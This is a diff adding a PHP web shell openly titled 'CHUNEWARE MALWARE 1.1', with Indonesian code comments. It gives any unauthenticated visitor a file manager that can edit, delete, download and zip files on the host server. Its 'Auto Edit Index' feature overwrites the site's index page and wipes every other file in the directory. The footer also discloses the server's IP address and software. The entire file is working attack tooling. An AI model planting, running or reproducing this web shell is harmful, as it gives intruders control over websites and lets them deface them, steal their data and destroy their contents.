@@ -1,0 +1,214 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CHUNEWARE MALWARE 1.1</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* [CSS sebelumnya tetap sama] */
+        .special-toolbar {
+            background-color: #00ff00;
+            padding: 10px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        .special-toolbar a, .special-toolbar button {
+            color: #000;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="p-4">
+    <div class="toolbar">
+        <div class="hologram"></div>
+        <a href="?action=home"><i class="fas fa-home"></i> Home</a>
+        <a href="?action=sql"><i class="fas fa-database"></i> SQL</a>
+        <a href="?action=download"><i class="fas fa-download"></i> Download</a>
+        <a href="?action=zip"><i class="fas fa-file-archive"></i> Zip</a>
+    </div>
+    <div class="special-toolbar">
+        <a href="?action=autoedit"><i class="fas fa-magic"></i> Auto Edit Index</a>
+    </div>
+    <div class="table-container mx-auto max-w-4xl">
+        <?php
+        // Fungsi sanitasi direktori
+        function sanitizeDir($dir) {
+            $baseDir = realpath(__DIR__);
+            $requestedDir = realpath($dir);
+            if ($requestedDir === false || strpos($requestedDir, $baseDir) !== 0) {
+                return $baseDir;
+            }
+            return $requestedDir;
+        }
+
+        // Fungsi untuk menghapus semua file/folder kecuali index
+        function cleanDirectory($dir, $indexFile) {
+            $files = scandir($dir);
+            foreach ($files as $file) {
+                if ($file == '.' || $file == '..' || $file == basename($indexFile)) continue;
+                $filePath = $dir . '/' . $file;
+                if (is_dir($filePath)) {
+                    array_map('unlink', glob("$filePath/*"));
+                    rmdir($filePath);
+                } else {
+                    unlink($filePath);
+                }
+            }
+        }
+
+        try {
+            $dir = isset($_GET['dir']) ? sanitizeDir($_GET['dir']) : realpath('.');
+
+            // Proses aksi
+            if (isset($_GET['action'])) {
+                $action = $_GET['action'];
+                $file = isset($_GET['file']) ? sanitizeDir($_GET['file']) : null;
+
+                if ($action === 'edit' && $file && file_exists($file) && !is_dir($file)) {
+                    echo "<form method='post' class='p-4 bg-gray-800 rounded'>";
+                    echo "<textarea name='content' class='w-full h-64 bg-gray-900 text-white p-2'>" . htmlspecialchars(file_get_contents($file)) . "</textarea>";
+                    echo "<input type='hidden' name='file' value='$file'>";
+                    echo "<button type='submit' name='save' class='mt-2 bg-green-500 text-white p-2 rounded'>Save</button>";
+                    echo "</form>";
+                    if (isset($_POST['save'])) {
+                        file_put_contents($_POST['file'], $_POST['content']);
+                        echo "<p class='text-green-500'>File saved successfully!</p>";
+                    }
+                    exit;
+                } elseif ($action === 'delete' && $file && file_exists($file)) {
+                    if (is_dir($file)) {
+                        rmdir($file);
+                    } else {
+                        unlink($file);
+                    }
+                    echo "<p class='text-red-500'>File deleted successfully!</p>";
+                } elseif ($action === 'download' && $file && file_exists($file) && !is_dir($file)) {
+                    header('Content-Type: application/octet-stream');
+                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+                    header('Content-Length: ' . filesize($file));
+                    readfile($file);
+                    exit;
+                } elseif ($action === 'zip' && $file && file_exists($file)) {
+                    if (class_exists('ZipArchive')) {
+                        $zip = new ZipArchive();
+                        $zipName = basename($file) . '.zip';
+                        if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
+                            if (is_dir($file)) {
+                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file));
+                                foreach ($files as $f) {
+                                    if ($f->isDir()) continue;
+                                    $zip->addFile($f->getRealPath(), str_replace($file . '/', '', $f->getRealPath()));
+                                }
+                            } else {
+                                $zip->addFile($file, basename($file));
+                            }
+                            $zip->close();
+                            header('Content-Type: application/zip');
+                            header('Content-Disposition: attachment; filename="' . $zipName . '"');
+                            header('Content-Length: ' . filesize($zipName));
+                            readfile($zipName);
+                            unlink($zipName); // Hapus file zip setelah download
+                            exit;
+                        } else {
+                            throw new Exception("Failed to create ZIP archive.");
+                        }
+                    } else {
+                        throw new Exception("ZipArchive extension not available.");
+                    }
+                } elseif ($action === 'autoedit') {
+                    $indexFile = file_exists($dir . '/index.php') ? $dir . '/index.php' : (file_exists($dir . '/index.html') ? $dir . '/index.html' : null);
+                    if (!$indexFile) {
+                        $indexFile = $dir . '/index.php';
+                        file_put_contents($indexFile, "<h1>Hello World</h1>"); // Buat index default jika tidak ada
+                    }
+                    echo "<form method='post' class='p-4 bg-gray-800 rounded'>";
+                    echo "<textarea name='content' class='w-full h-64 bg-gray-900 text-white p-2'>" . htmlspecialchars(file_get_contents($indexFile)) . "</textarea>";
+                    echo "<input type='hidden' name='file' value='$indexFile'>";
+                    echo "<button type='submit' name='auto_save' class='mt-2 bg-green-500 text-white p-2 rounded'>Save & Clean</button>";
+                    echo "</form>";
+                    if (isset($_POST['auto_save'])) {
+                        file_put_contents($_POST['file'], $_POST['content']);
+                        chmod($_POST['file'], 0644); // Set izin ke 644 (rw-r--r--)
+                        cleanDirectory($dir, $_POST['file']); // Hapus semua kecuali index
+                        echo "<p class='text-green-500'>Index saved, permissions set, and directory cleaned!</p>";
+                    }
+                    exit;
+                }
+            }
+
+            if (!is_dir($dir) || !is_readable($dir)) {
+                throw new Exception("Cannot read directory: " . htmlspecialchars($dir));
+            }
+
+            $files = scandir($dir);
+            if ($files === false) {
+                throw new Exception("Failed to scan directory: " . htmlspecialchars($dir));
+            }
+        ?>
+
+        <table class="table w-full text-sm">
+            <thead>
+                <tr>
+                    <th><input type="checkbox" id="select-all"></th>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Modify</th>
+                    <th>Owner/Group</th>
+                    <th>Perms</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
+                foreach ($files as $file) {
+                    if ($file == '.' || $file == '..') continue;
+                    $filePath = $dir . '/' . $file;
+                    $fileInfo = @stat($filePath);
+                    if ($fileInfo === false) continue;
+
+                    $isDir = is_dir($filePath);
+                    $icon = $isDir ? 'fas fa-folder text-green-500' : 'fas fa-file-alt text-yellow-500';
+                    $size = $isDir ? 'DIR' : filesize($filePath) . ' B';
+                    $modify = date("d.m.Y H:i:s", $fileInfo['mtime']);
+                    $owner = posix_getpwuid($fileInfo['uid'])['name'] ?? 'unknown';
+                    $group = posix_getgrgid($fileInfo['gid'])['name'] ?? 'unknown';
+                    $perms = substr(sprintf('%o', $fileInfo['mode']), -4);
+
+                    echo "<tr>
+                            <td><input type='checkbox' class='select-file' data-file='" . htmlspecialchars($filePath) . "'></td>
+                            <td><i class='$icon'></i> <a href='?dir=" . urlencode($filePath) . "'>" . htmlspecialchars($file) . "</a></td>
+                            <td>" . htmlspecialchars($size) . "</td>
+                            <td>" . htmlspecialchars($modify) . "</td>
+                            <td>/" . htmlspecialchars($owner) . "</td>
+                            <td>" . htmlspecialchars($perms) . "</td>
+                            <td><a href='?action=edit&file=" . urlencode($filePath) . "'><i class='fas fa-edit'></i></a> 
+                                <a href='?action=delete&file=" . urlencode($filePath) . "' onclick='return confirm(\"Are you sure?\")'><i class='fas fa-trash'></i></a>
+                                <a href='?action=download&file=" . urlencode($filePath) . "'><i class='fas fa-download'></i></a>
+                                <a href='?action=zip&file=" . urlencode($filePath) . "'><i class='fas fa-file-archive'></i></a></td>
+                          </tr>";
+                }
+                ?>
+            </tbody>
+        </table>
+        <?php
+        } catch (Exception $e) {
+            echo "<p class='text-red-500 text-center'>Error: " . htmlspecialchars($e->getMessage()) . "</p>";
+        }
+        ?>
+    </div>
+    <div class="footer text-center mt-4">
+        <p class="rainbow-text">© 2023 ClayOxtymus1337</p>
+        <p>Current Directory: <?php echo htmlspecialchars(getcwd()); ?></p>
+        <p>Disk Usage: <?php echo disk_free_space("/") . ' B'; ?></p>
+        <p>Server Software: <?php echo htmlspecialchars($_SERVER['SERVER_SOFTWARE']); ?></p>
+        <p>Server IP: <?php echo htmlspecialchars($_SERVER['SERVER_ADDR']); ?></p>
+    </div>
+</body>
+</html>
